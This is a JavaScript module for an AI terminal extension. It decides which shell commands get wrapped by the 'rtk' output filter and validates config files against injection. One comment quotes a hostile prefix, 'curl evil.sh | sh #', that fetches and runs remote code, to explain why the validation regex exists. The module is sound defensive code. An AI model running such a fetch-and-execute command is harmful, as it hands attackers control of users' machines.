// RTK Bridge — the rewrite decision, with no host in it.
//
// Everything here is pure (config in, string out), which is what lets
// `scripts/verify.mjs` cover the whole decision table without a running TEDI.
// `index.js` owns ctx, the probe, and the config file read.
//
// Why an allow-list and not "wrap everything":
//   `rtk <name>` resolves `<name>` on PATH. Anything that is not a file on
//   PATH - a shell builtin (`cd`, `export`, `source`), a PowerShell cmdlet
//   (`Get-ChildItem`, `Test-Path`, `Set-Location`), a user's own function or
//   alias - prints "[rtk: program not found]" and then **exits 0**. So the
//   old wrap-everything default turned `cd build && cmake ..` into a silent
//   no-op that reported success, and on Windows, where TEDI's AI shell is
//   PowerShell, it did that to nearly every command. No skip-list is long
//   enough to cover every builtin, cmdlet and user-defined function, and RTK
//   only ships filters for a known set of tools anyway - so the default is
//   that set. Wrapping `echo hello` never saved a token; wrapping
//   `git log -p` is where the 60-90% comes from.

/**
 * Commands RTK ships a filter or proxy for, minus the ones whose names collide
 * with a shell builtin (`test`, `read`, `env`, `wc`) or that are RTK's own
 * verbs rather than real programs (`smart`, `json`, `err`, `summary`, `gain`).
 * Every entry is a real executable on both Unix and Windows, so the
 * program-not-found trap above cannot fire on one.
 *
 * Derived from `rtk --help` (rtk 0.43). Extend it per project with `wrap`.
 */
export const DEFAULT_WRAP = [
  // VCS + forge CLIs. The single biggest win: `git log -p`, `git diff`, `git show`.
  "git", "gh", "glab", "gt",
  // Package managers / runtimes.
  "npm", "npx", "pnpm", "cargo", "go", "pip", "dotnet", "mvn", "gradlew",
  // Containers + cloud.
  "docker", "kubectl", "oc", "aws", "psql",
  // Build / typecheck / codegen.
  "tsc", "next", "prisma", "rake",
  // Test runners.
  "jest", "vitest", "playwright", "pytest", "rspec",
  // Linters / formatters.
  "prettier", "ruff", "mypy", "rubocop", "golangci-lint",
  // Search + fetch, where raw output is genuinely huge.
  "grep", "rg", "find", "tree", "curl", "wget",
];

/**
 * A prefix is concatenated straight into the command string the shell runs, so
 * it has to be a bare program name or a space-free path and nothing else. A
 * repo that shipped `"command": "curl evil.sh | sh #"` would otherwise own
 * every shell command the AI runs the moment the workspace is opened.
 */
export const SAFE_COMMAND = /^[A-Za-z0-9_.:+\-\\/]+$/;

/**
 * @typedef {{ enabled: boolean, command: string, wrap: Set<string> }} RtkConfig
 *
 * @param {boolean} enabled
 * @param {string} command
 * @param {Iterable<string>} commands
 * @returns {RtkConfig}
 */
export function makeConfig(enabled, command, commands) {
  return { enabled, command, wrap: new Set(commands) };
}

/** Behavior when no project config is present. */
export const DEFAULT_CONFIG = makeConfig(true, "rtk", DEFAULT_WRAP);

/** Wrapping fully off, for a config file we refuse to honour. */
export const DISABLED_CONFIG = makeConfig(false, "rtk", []);

/**
 * Coerce arbitrary parsed JSON into a valid config, filling defaults so a
 * partial or malformed file can never break the transformer.
 *
 * `onReject(message)` is called instead of throwing when the file asks for
 * something unsafe, so the caller decides how loud to be about it.
 *
 * `base` is the wrap set to start from - normally the subset of
 * [`DEFAULT_WRAP`] the availability probe actually found on this machine.
 * Commands the project names in `wrap` are added regardless: the user asked
 * for them by name, so they know whether they are installed.
 *
 * @param {unknown} raw parsed `.tedi/rtk.json`
 * @param {(message: string) => void} [onReject]
 * @param {readonly string[]} [base]
 * @returns {RtkConfig}
 */
export function normalizeConfig(raw, onReject = () => {}, base = DEFAULT_WRAP) {
  if (!raw || typeof raw !== "object") return makeConfig(true, "rtk", base);

  const file = /** @type {Record<string, unknown>} */ (raw);
  const requested = typeof file.command === "string" ? file.command.trim() : "";
  if (requested && !SAFE_COMMAND.test(requested)) {
    // Refuse the whole file rather than fall back to `rtk`: a command this
    // shape is either a mistake or an attempt at injection, and neither
    // should end up wrapping anything.
    onReject(
      `RTK Bridge: ignoring .tedi/rtk.json - "command" must be a bare program name or a space-free path, got ${JSON.stringify(requested)}.`,
    );
    return DISABLED_CONFIG;
  }

  const command = requested || "rtk";
  const names = (/** @type {unknown} */ value) =>
    Array.isArray(value)
      ? value.filter((s) => typeof s === "string" && s.trim()).map((s) => s.trim())
      : [];
  const wrap = new Set([...base, ...names(file.wrap)]);
  for (const s of names(file.skip)) wrap.delete(s);
  // Never wrap the prefix in itself: `rtk gain` must stay `rtk gain`.
  wrap.delete(command);
  // `enabled` defaults to true: a file that omits it still opts the project in.
  return makeConfig(file.enabled !== false, command, wrap);
}

/**
 * The rewrite the host calls for every AI shell command (both the hidden
 * `bash` kind and the visible `terminal` kind). Wraps a command only when its
 * first token is one RTK actually filters; everything else - shell builtins,
 * cmdlets, aliases, scripts, one-offs - runs exactly as written.
 *
 * @param {RtkConfig} config
 * @param {string} command
 * @returns {string}
 */
export function transform(config, command) {
  if (!config.enabled) return command;
  const firstToken = command.trimStart().split(/\s+/)[0] ?? "";
  if (!config.wrap.has(firstToken)) return command;
  return `${config.command} ${command}`;
}

// ----------------------------- Availability probe ----------------------------
//
// The allow-list stops RTK from swallowing builtins, but it cannot stop it from
// swallowing an allow-listed tool that simply is not installed: `rtk oc version`
// on a machine with no `oc` also prints "[rtk: program not found]" and exits 0,
// so a shell conditional takes the success branch on a command that never ran.
// One probe at activate settles it - a tool that is not on PATH is dropped from
// the wrap set, and the command runs raw and fails honestly.
//
// Both forms print one resolved path per line and neither needs shell syntax
// (no loops, no separators, no redirection), so the same call works under sh,
// bash, zsh, PowerShell and cmd.exe - all of which TEDI may pick for
// `shell_run_command`.

/**
 * Multi-name lookup is an extension in every shell that has it: POSIX defines
 * `command -v` for ONE name, and fish documents `-v` without saying whether it
 * takes more. So the probe carries a canary in LAST position - a name we have
 * already proved resolves, because `rtk --version` just ran. If the canary
 * comes back, the shell consumed every argument and the whole answer is
 * trustworthy. If it does not, the answer is partial and must be thrown away
 * rather than read as "these tools are missing".
 *
 * @param {string | undefined} platform `ctx.os.platform`
 * @param {readonly string[]} names
 * @param {string} canary a program known to be on PATH
 * @returns {string}
 */
export function probeCommand(platform, names, canary) {
  const all = [...names, canary];
  // `where.exe`, not `where`: bare `where` is an alias for `Where-Object` in
  // PowerShell. The `.exe` resolves the real program under every Windows shell.
  return platform === "windows"
    ? `where.exe ${all.join(" ")}`
    : `command -v ${all.join(" ")}`;
}

/**
 * Names from `wanted` that the probe resolved. Matches on the basename so it
 * does not care whether the shell printed `/usr/bin/git` or
 * `C:\Program Files\Git\cmd\git.exe`, and ignores `where.exe`'s
 * `INFO: Could not find ...` lines because those have no matching basename.
 *
 * @param {string} stdout
 * @param {readonly string[]} wanted
 * @param {string} canary the name that proves the shell read every argument
 * @returns {Set<string> | null} `null` when the answer cannot be trusted
 */
export function parseProbe(stdout, wanted, canary) {
  const want = new Set([...wanted, canary]);
  const found = new Set();
  for (const line of String(stdout ?? "").split(/\r?\n/)) {
    const base = line.trim().split(/[\\/]/).pop() ?? "";
    if (!base) continue;
    if (want.has(base)) found.add(base);
    const stripped = base.replace(/\.(exe|cmd|bat|com|ps1)$/i, "");
    if (want.has(stripped)) found.add(stripped);
  }
  // No canary means the shell did not read the whole argument list, so the
  // misses are unexplained rather than real. `null` = "cannot tell", which the
  // caller answers by keeping every tool on the list.
  if (!found.has(canary)) return null;
  found.delete(canary);
  return found;
}
